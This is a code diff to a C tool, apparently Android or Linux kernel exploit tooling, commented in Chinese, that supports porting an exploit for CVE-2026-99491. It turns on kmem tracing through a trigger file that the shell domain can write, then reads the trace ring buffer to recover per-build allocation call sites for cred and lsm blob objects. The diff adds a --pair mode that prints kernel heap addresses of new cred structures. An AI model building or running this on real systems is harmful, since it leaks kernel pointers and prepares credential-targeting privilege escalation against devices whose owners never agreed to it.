@@ -4,15 +4,13 @@
  * 用于 CVE-2026-99491 移植：上游按 `call_site & 0x1fffff` 过滤 cred 与
  * lsm blob 的分配记录，而这个值随内核构建变化，必须在新内核上实测。
  *
- * 只读：只打开 tracefs、触发一次 exec、读 ring buffer；不写内核内存。
+ * 只读：只打开 tracefs、触发若干次 exec、读 ring buffer；不写内核内存。
  *
  * 用法：
- *   site_probe [-v] [--exec PATH] [--repeat N]
+ *   site_probe [-v] [--pair] [--exec PATH] [--repeat N]
  *
- * 输出示例：
- *   [cred] site_low21=0x6c02c req=0xb8 name=cred
- *   [kmem] etype=0x13a site_low21=0x6c02c req=0xb8 name=cred
- *   [kmalloc] etype=0x... site_low21=0x... req=0x28
+ * --pair：按时间顺序把「cred 分配」与紧随其后的 kmalloc 配对，
+ *         直接给出 lsm blob 的分配点（否则只能从 req 范围里猜）。
  */
 #define _GNU_SOURCE 1
 #include <errno.h>
@@ -35,13 +33,16 @@
 #define PAGE_SZ 4096UL
 #define RAW_MAX (8U << 20)
 #define MAX_KINDS 64
+#define MAX_PEND 32
 
-/* 6.18 kmem record 里我们关心的两个字段偏移（见 ring 布局注释） */
+/* 6.18 kmem record 字段偏移 */
 #define OFF_SITE 8
 #define OFF_DESC 24
 #define OFF_REQ_CACHE 32 /* kmem_cache_alloc: bytes_req */
 #define OFF_REQ_KMALLOC 24 /* kmalloc: bytes_req */
 #define ETYPE_CACHE_ALLOC 0x13a
+#define CRED_REQ 0xb8ULL
+#define PAIR_REQ_MAX 0x200ULL
 
 struct kind {
 	unsigned etype;
@@ -53,8 +54,15 @@ struct kind {
 
 static struct kind kinds[MAX_KINDS];
 static int nkinds;
-
 static int verbose;
+static int pair_mode;
+
+/* 每个 pid 最近一次 cred 分配（用于配对） */
+static struct {
+	unsigned pid;
+	unsigned long long ptr;
+	int set;
+} pends[MAX_PEND];
 
 static long now_ms(void)
 {
@@ -112,7 +120,26 @@ static void record(unsigned etype, unsigned low21, unsigned long long req, const
 	nkinds++;
 }
 
-/* ring 条目遍历；布局同 6.18 trace ring（type word + 紧凑条目） */
+static int pend_index(unsigned pid, int create)
+{
+	for (int i = 0; i < MAX_PEND; i++) {
+		if (pends[i].set && pends[i].pid == pid)
+			return i;
+	}
+	if (!create)
+		return -1;
+	for (int i = 0; i < MAX_PEND; i++) {
+		if (!pends[i].set) {
+			pends[i].set = 1;
+			pends[i].pid = pid;
+			pends[i].ptr = 0;
+			return i;
+		}
+	}
+	return -1;
+}
+
+/* ring 条目遍历；布局同 6.18 trace ring */
 static void scan_ring(const unsigned char *b, size_t n, int self_pid)
 {
 	for (size_t base = 0; base + PAGE_SZ <= n; base += PAGE_SZ) {
@@ -126,7 +153,7 @@ static void scan_ring(const unsigned char *b, size_t n, int self_pid)
 			size_t total, elen;
 			const unsigned char *p;
 			unsigned etype, epid;
-			unsigned long long site, req;
+			unsigned long long site, req, ptr;
 			unsigned d, noff, nlen;
 			char name[24] = "";
 
@@ -153,6 +180,7 @@ static void scan_ring(const unsigned char *b, size_t n, int self_pid)
 			}
 
 			site = u64le(p + OFF_SITE);
+			ptr = u64le(p + 16);
 			if (etype == ETYPE_CACHE_ALLOC && elen >= 61) {
 				req = u64le(p + OFF_REQ_CACHE);
 				d = u32le(p + OFF_DESC);
@@ -166,6 +194,29 @@ static void scan_ring(const unsigned char *b, size_t n, int self_pid)
 				o += total;
 				continue;
 			}
+
+			if (pair_mode) {
+				if (etype == ETYPE_CACHE_ALLOC && !strcmp(name, "cred") &&
+				    req == CRED_REQ) {
+					int k = pend_index(epid, 1);
+
+					if (k >= 0) {
+						pends[k].ptr = ptr;
+						if (verbose)
+							printf("[p] cred pid=%u ptr=%#llx\n", epid, ptr);
+					}
+				} else if (etype != ETYPE_CACHE_ALLOC && req <= PAIR_REQ_MAX) {
+					int k = pend_index(epid, 0);
+
+					if (k >= 0 && pends[k].ptr) {
+						printf("[pair] cred=%#llx blob_site=%#07x req=%#llx pid=%u\n",
+						       pends[k].ptr, (unsigned)(site & 0x1fffffUL),
+						       req, epid);
+						pends[k].ptr = 0;
+					}
+				}
+			}
+
 			record(etype, (unsigned)(site & 0x1fffffUL), req, name);
 			if (verbose)
 				printf("[raw] etype=%#x site=%#llx low21=%#x req=%#llx name=%s\n",
@@ -205,13 +256,14 @@ int main(int argc, char **argv)
 	for (int i = 1; i < argc; i++) {
 		if (!strcmp(argv[i], "-v"))
 			verbose = 1;
+		else if (!strcmp(argv[i], "--pair"))
+			pair_mode = 1;
 		else if (!strcmp(argv[i], "--exec") && i + 1 < argc)
 			exec_path = argv[++i];
 		else if (!strcmp(argv[i], "--repeat") && i + 1 < argc)
 			repeat = atoi(argv[++i]);
 	}
 
-	/* 打开 kmem 事件：只能经 rss_stat 的 trigger（shell 域对该文件可写） */
 	wr(TRIGGER, "!enable_event:kmem:kmem_cache_alloc\n");
 	wr(TRIGGER, "!enable_event:kmem:kmalloc\n");
 	wr(TRACE_BUF, "8192\n");
